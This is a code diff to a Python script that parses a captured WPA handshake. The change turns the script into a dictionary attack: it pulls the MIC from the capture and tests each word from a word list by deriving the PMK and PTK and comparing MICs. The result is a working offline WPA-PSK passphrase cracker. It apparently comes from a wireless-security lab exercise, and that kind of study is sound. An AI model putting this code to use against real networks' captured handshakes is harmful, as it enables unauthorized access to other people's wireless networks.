@@ -23,17 +23,6 @@ from numpy import array_split
 from numpy import array
 import hmac, hashlib
 
-
-def bruteforce():
-    # Open the UNIX dictonary of words.
-    with open('words.txt', 'r') as f:
-        words = f.read().split()
-
-    # Loop over all the words.
-    for word in words:
-	print word
-
-
 # Read capture file -- it contains beacon, authentication, associacion, handshake and data
 wpa=rdpcap("wpa_handshake.cap") 
 
@@ -51,7 +40,8 @@ Clientmac   = a2b_hex(wpa[1].addr1.replace(":",""))
 ANonce      = (wpa[5].load)[13:45]
 SNonce      = (wpa[6].load)[13:45]
 
-mic_to_test = "36eef66540fa801ceee2fea9b7929b40"
+
+mic_to_test = b2a_hex((wpa[8].load)[77:93])
 
 B           = min(APmac,Clientmac)+max(APmac,Clientmac)+min(ANonce,SNonce)+max(ANonce,SNonce) #used in pseudo-random function
 
@@ -69,6 +59,7 @@ print "Client Nonce: ",b2a_hex(SNonce),"\n"
 
 
 
+
 def customPRF512(key,A,B):
     """
     This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
@@ -82,22 +73,51 @@ def customPRF512(key,A,B):
         R = R+hmacsha1.digest()
     return R[:blen]
 
-#calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
-pmk = pbkdf2_hex(passPhrase, ssid, 4096, 32)
+def generateKey(passPhrase):
+	
+	#calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
+	pmk = pbkdf2_hex(passPhrase, ssid, 4096, 32)
 
-#expand pmk to obtain PTK
-ptk = customPRF512(a2b_hex(pmk),A,B)
+	#expand pmk to obtain PTK
+	ptk = customPRF512(a2b_hex(pmk),A,B)
 
-#calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
-mic = hmac.new(ptk[0:16],data,hashlib.sha1)
+	#calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
+	mic = hmac.new(ptk[0:16],data,hashlib.sha1)
+
+	micToCompare = mic.hexdigest()[:32]
+
+	print micToCompare
+	print mic_to_test
+
+	if micToCompare == mic_to_test:
+		print "good my friend"
+	else:
+		print "Not good my friend"
+
+	
 
 
-print "\nResults of the key expansion"
-print "============================="
-print "PMK:\t\t",pmk,"\n"
-print "PTK:\t\t",b2a_hex(ptk),"\n"
-print "KCK:\t\t",b2a_hex(ptk[0:16]),"\n"
-print "KEK:\t\t",b2a_hex(ptk[16:32]),"\n"
-print "TK:\t\t",b2a_hex(ptk[32:48]),"\n"
-print "MICK:\t\t",b2a_hex(ptk[48:64]),"\n"
-print "MIC:\t\t",mic.hexdigest(),"\n"
+	#print "\nResults of the key expansion"
+	#print passPhrase
+	#print "============================="
+	#print "PMK:\t\t",pmk,"\n"
+	#print "PTK:\t\t",b2a_hex(ptk),"\n"
+	#print "KCK:\t\t",b2a_hex(ptk[0:16]),"\n"
+	#print "KEK:\t\t",b2a_hex(ptk[16:32]),"\n"
+	#print "TK:\t\t",b2a_hex(ptk[32:48]),"\n"
+	#print "MICK:\t\t",b2a_hex(ptk[48:64]),"\n"
+	#print "MIC:\t\t",micToCompare,"\n"
+
+def bruteforce():
+    # Open the UNIX dictonary of words.
+    with open('words.txt', 'r') as f:
+        words = f.read().split()
+
+    # Loop over all the words.
+    for word in words:
+	generateKey(word)
+
+bruteforce()
+generateKey(passPhrase)
+
+
